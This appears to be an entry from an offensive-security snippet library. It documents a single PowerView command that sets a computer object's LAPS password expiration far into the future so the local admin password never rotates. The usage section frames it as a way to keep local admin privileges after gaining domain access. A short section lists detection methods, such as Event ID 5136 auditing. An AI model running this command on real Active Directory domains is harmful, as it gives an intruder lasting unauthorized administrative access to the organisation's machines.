---
id: 2009980b-0229-4aae-a28f-507070e92f61
name: PowerShell-Set-LAPS-Expiration-Time
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:28.479214+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - laps
  - active-directory
validated: true
---

# PowerShell-Set-LAPS-Expiration-Time

## Code

```ps1
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

## Description

This PowerShell snippet uses the Set-DomainObject function (from PowerView) to update the LAPS password expiration time on an AD computer object to a future date, preventing password rotation and enabling persistence. The value 232609935231523081 corresponds to a FILETIME far in the future (~year 9999).

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <target_machine> | NetBIOS or DN of the target computer object | WORKSTATION01 |
| 232609935231523081 | 64-bit integer for expiration time (100-ns intervals since 1601-01-01 UTC) | 232609935231523081 |

## Usage

Load PowerView in a PowerShell session on a domain-joined machine with appropriate credentials, then execute the snippet. Use after gaining domain access to maintain local admin privileges via unchanged LAPS passwords. Verify with Get-DomainObject before and after.

## Detection

- Audit AD changes via Event ID 5136 (Directory Service Changes) for ms-Mcs-AdmPwdExpirationTime modifications.
- Monitor PowerShell execution logs for Set-DomainObject invocations.
- Alert on unusually large expiration values in LAPS attributes using scripts or SIEM rules.

## Related

- [[procedures/Set-LAPS-Password-Expiration-Time-for-Persistence]]
- [[tools/PowerView]]
